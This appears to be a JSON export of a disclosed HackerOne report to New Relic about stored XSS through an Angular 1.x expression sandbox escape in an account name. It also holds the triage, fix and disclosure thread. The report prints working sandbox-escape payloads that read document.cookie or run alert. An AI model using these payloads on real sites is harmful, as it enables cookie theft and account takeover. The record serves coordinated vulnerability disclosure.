{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-05-22T01:26:42.622Z", 
    "voters": [
        "dyabla"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 124724, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-05-20T23:30:28.519Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Stored XSS through Angular Expression Sandbox Escape", 
    "is_member_of_team?": null, 
    "vote_count": 1, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-06-19T23:30:28.635Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "Insights_XSS_New_Relic.png", 
            "type": "image/png", 
            "id": 80082, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/080/082/406ceadc0f1e872ec8ec9198a99740e59c0bf090/Insights_XSS_New_Relic.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225414Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5c7ad0a44cd2a9f13e3179b28d3fdddbcd9fc4e8602b635adcd3ea49fbed40ee"
        }, 
        {
            "file_name": "Account_settings_Expression_Escape_New_Relic.png", 
            "type": "image/png", 
            "id": 80083, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/080/083/305c527916a600c04428a51114d7e5bc41faa13a/Account_settings_Expression_Escape_New_Relic.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225414Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8f4f4bd907d47aa7a3e0064f0115b0ffa61be7fd9da97adf2606d69f33bcf19e"
        }, 
        {
            "file_name": "Resolved_Insights_Expression_New_Relic.png", 
            "type": "image/png", 
            "id": 80084, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/080/084/e8152f60dec75ec92780730e70bd532070f6f9f6/Resolved_Insights_Expression_New_Relic.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225414Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3fe7452067e5ba960c6f5dbf46dffa57a119e62edacb5b3709fee31c5dc2f497"
        }, 
        {
            "file_name": "Account_settings_Expression_New_Relic.png", 
            "type": "image/png", 
            "id": 80085, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/080/085/3ed41cb868597cf739d7cfe5980ce72bb063cf95/Account_settings_Expression_New_Relic.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225414Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ce1e2c515f71ab318b19df16640334447d573931f2d257629828bdf3067c048c"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-03-23T00:36:09.701Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-23T00:36:09.701Z", 
            "actor": {
                "username": "imelven", 
                "url": "/imelven", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/153/4df54ed716b59237add2eccc46f1f39b24d6feef_medium.jpeg?1454633488"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Thanks for your report, Ryan, this looks like an interesting issue ! We're investigating. ", 
            "markdown_message": "<p>Thanks for your report, Ryan, this looks like an interesting issue ! We&#39;re investigating. </p>\n", 
            "type": "Activities::Comment", 
            "id": 863692, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-23T00:44:04.263Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-23T00:44:04.263Z", 
            "actor": {
                "username": "ryhanson", 
                "url": "/ryhanson", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/031/913/2d214d07227f363e60d5002db4f241f08e036057_medium.jpg?1464648946"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Angular Expression Injections are a newer attack vector that not a lot of developers are taking into consideration. They often happen when mixing server side and client side templates.\n\nUpgrading to Angular 1.5.x will mitigate the sandbox escape and Javascript execution, but not the expression injection itself. I'm sure the developers will quickly find out what is happening :) I've found the exact vulnerability in mine and my co-workers code before.\n\nLet me know if you need any more information!", 
            "markdown_message": "<p>Angular Expression Injections are a newer attack vector that not a lot of developers are taking into consideration. They often happen when mixing server side and client side templates.</p>\n\n<p>Upgrading to Angular 1.5.x will mitigate the sandbox escape and Javascript execution, but not the expression injection itself. I&#39;m sure the developers will quickly find out what is happening :) I&#39;ve found the exact vulnerability in mine and my co-workers code before.</p>\n\n<p>Let me know if you need any more information!</p>\n", 
            "type": "Activities::Comment", 
            "id": 863705, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-24T23:20:01.025Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-24T23:20:01.025Z", 
            "actor": {
                "username": "mlapworth", 
                "url": "/mlapworth", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/133/9e85d8632926096fed12357c0d7835402c3c06a9_medium.JPG?1437669168"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 870334, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-29T17:31:28.219Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-29T17:31:28.219Z", 
            "actor": {
                "username": "mlapworth", 
                "url": "/mlapworth", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/133/9e85d8632926096fed12357c0d7835402c3c06a9_medium.JPG?1437669168"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Hi Ryan,\n\nWe've deployed a fix for this issue to production. Would you mind verifying that fix?\n\nThank you", 
            "markdown_message": "<p>Hi Ryan,</p>\n\n<p>We&#39;ve deployed a fix for this issue to production. Would you mind verifying that fix?</p>\n\n<p>Thank you</p>\n", 
            "type": "Activities::Comment", 
            "id": 876649, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-29T18:20:49.484Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-29T18:20:49.484Z", 
            "actor": {
                "username": "ryhanson", 
                "url": "/ryhanson", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/031/913/2d214d07227f363e60d5002db4f241f08e036057_medium.jpg?1464648946"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Hey!\n\nJust verified that there is no longer an Angular Expression Injection vulnerability in the account name on the Insights Dashboard.\n\nGreat job fixing it so quickly! :)\n\nHave a good one,\nRyan", 
            "markdown_message": "<p>Hey!</p>\n\n<p>Just verified that there is no longer an Angular Expression Injection vulnerability in the account name on the Insights Dashboard.</p>\n\n<p>Great job fixing it so quickly! :)</p>\n\n<p>Have a good one,<br>\nRyan</p>\n", 
            "type": "Activities::Comment", 
            "id": 876720, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "ryhanson", 
                "url": "/ryhanson"
            }, 
            "created_at": "2016-03-30T00:35:42.427Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-30T00:35:42.427Z", 
            "actor": {
                "username": "mlapworth", 
                "url": "/mlapworth", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/133/9e85d8632926096fed12357c0d7835402c3c06a9_medium.JPG?1437669168"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Thanks for the great report Ryan!\n\nCheers,\nMatt", 
            "markdown_message": "<p>Thanks for the great report Ryan!</p>\n\n<p>Cheers,<br>\nMatt</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 877289, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-20T23:30:28.599Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-20T23:30:28.599Z", 
            "actor": {
                "username": "imelven", 
                "url": "/imelven", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/153/4df54ed716b59237add2eccc46f1f39b24d6feef_medium.jpeg?1454633488"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "first_to_agree": true, 
            "message": "We'd like to disclose this resolved issue. ", 
            "markdown_message": "<p>We&#39;d like to disclose this resolved issue. </p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 967140, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-22T01:26:42.759Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-22T01:26:42.759Z", 
            "actor": {
                "username": "ryhanson", 
                "url": "/ryhanson", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/031/913/2d214d07227f363e60d5002db4f241f08e036057_medium.jpg?1464648946"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 968550, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-22T01:26:42.895Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-22T01:26:42.895Z", 
            "actor": {
                "username": "ryhanson", 
                "url": "/ryhanson", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/031/913/2d214d07227f363e60d5002db4f241f08e036057_medium.jpg?1464648946"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 968551, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-03T03:25:50.042Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-03T03:25:50.042Z", 
            "actor": {
                "url": "/newrelic", 
                "profile": {
                    "name": "New Relic"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/011/94822999c270d791d185b40e07d36cc864e96faa_medium.?1482361910"
                }
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::NotEligibleForBounty", 
            "id": 2694192, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "ryhanson", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/ryhanson", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/031/913/0b0e831bd4c9dd203d7820c2a365a1b1b5722f73_small.jpg?1464648946"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 60, 
        "name": "Cross-site Scripting (XSS) - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -77757826.16511443, 
    "disclosed_at": "2016-05-22T01:26:42.875Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/124724", 
    "created_at": "2016-03-21T00:16:59.891Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>As an Admin of an account, I am able to set the Name of the Account to an Angular expression. This Angular expressions is resolved and executed on the <a href=\"/redirect?signature=3a926b8a6ea30394548a96b8e26ec5559ff72e1f&amp;url=https%3A%2F%2Finsights.newrelic.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Insights Welcome Page</span><i class=\"icon-external-link\"></i></a> for anyone that is apart of the Account.</p>\n\n<p>Due to the ability to invite anyone (even current NewRelic) users to an Account, it opens up the possibility for an attack on another user. This angular expression not only can be escaped and used to execute Javascript, but it can also access anything within the Angular scope on the Insights dashboard.</p>\n\n<p>Here are is the Proof of Concept for the sandbox escape that logs the cookie to the console:</p>\n<pre class=\"highlight plaintext\"><code>{{{}[{toString:[].join,length:1,0:&#39;__proto__&#39;}].assign=[].join;\n  &#39;a&#39;.constructor.prototype.charAt=[].join;\n  $eval(&#39;x=console[\\&#39;log\\&#39;](document[\\&#39;cookie\\&#39;])//&#39;);  }}\n</code></pre>\n<p>Here is one with an alert:</p>\n<pre class=\"highlight plaintext\"><code>{{{}[{toString:[].join,length:1,0:&#39;__proto__&#39;}].assign=[].join;\n  &#39;a&#39;.constructor.prototype.charAt=[].join;\n  $eval(&#39;x=alert(\\&#39;New Relic XSS\\&#39;)//&#39;);  }}\n</code></pre>\n<p>This will resolve to the current account ID in the nav. This demonstrates the ability to traverse through the angular scope. These can often be bad when there are API methods available. I didn&#39;t look through the Scope enough to gauge the severity of what could be done with just an Angular expression.</p>\n<pre class=\"highlight plaintext\"><code>Account ID: {{ this.$$childHead.$$nextSibling.$$nextSibling.$$nextSibling.currentaccountId }}\n</code></pre>\n<p>I have attached screenshots demonstrating these things. If you have any questions or need more details, please let me know!</p>\n", 
    "vulnerability_information": "As an Admin of an account, I am able to set the Name of the Account to an Angular expression. This Angular expressions is resolved and executed on the [Insights Welcome Page](https://insights.newrelic.com) for anyone that is apart of the Account.\n\nDue to the ability to invite anyone (even current NewRelic) users to an Account, it opens up the possibility for an attack on another user. This angular expression not only can be escaped and used to execute Javascript, but it can also access anything within the Angular scope on the Insights dashboard.\n\nHere are is the Proof of Concept for the sandbox escape that logs the cookie to the console:\n```\n{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;\n  'a'.constructor.prototype.charAt=[].join;\n  $eval('x=console[\\'log\\'](document[\\'cookie\\'])//');  }}\n```\n\nHere is one with an alert:\n```\n{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;\n  'a'.constructor.prototype.charAt=[].join;\n  $eval('x=alert(\\'New Relic XSS\\')//');  }}\n```\n\nThis will resolve to the current account ID in the nav. This demonstrates the ability to traverse through the angular scope. These can often be bad when there are API methods available. I didn't look through the Scope enough to gauge the severity of what could be done with just an Angular expression.\n```\nAccount ID: {{ this.$$childHead.$$nextSibling.$$nextSibling.$$nextSibling.currentaccountId }}\n```\n\nI have attached screenshots demonstrating these things. If you have any questions or need more details, please let me know!\n\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://newrelic.com", 
            "about": "New Relic's Coordinated Disclosure Program", 
            "twitter_handle": "newrelic", 
            "name": "New Relic"
        }, 
        "handle": "newrelic", 
        "url": "https://hackerone.com/newrelic", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/017/011/4a259e2f731f105c784b1279db99215cefb8abbd_small.?1482361910", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/017/011/94822999c270d791d185b40e07d36cc864e96faa_medium.?1482361910"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 17011, 
        "default_currency": "usd"
    }, 
    "is_published": false
}